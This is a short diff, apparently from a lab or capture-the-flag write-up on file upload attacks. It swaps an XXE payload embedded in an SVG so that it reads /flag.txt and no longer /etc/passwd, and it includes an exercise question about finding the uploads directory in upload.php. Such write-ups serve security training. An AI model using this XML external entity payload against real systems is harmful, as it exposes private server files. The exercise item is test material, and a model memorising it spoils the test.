@@ -79,7 +79,7 @@ If the upload function is vulnerable to directory traversal, we may also attempt
 
 ```xml
 
-<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <svg>&xxe;</svg>
+<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]> <svg>&xxe;</svg>
 ```
 
 ### Try to read the source code of 'upload.php' to identify the uploads directory, and use its name as the answer. (write it exactly as found in the source, without quotes)
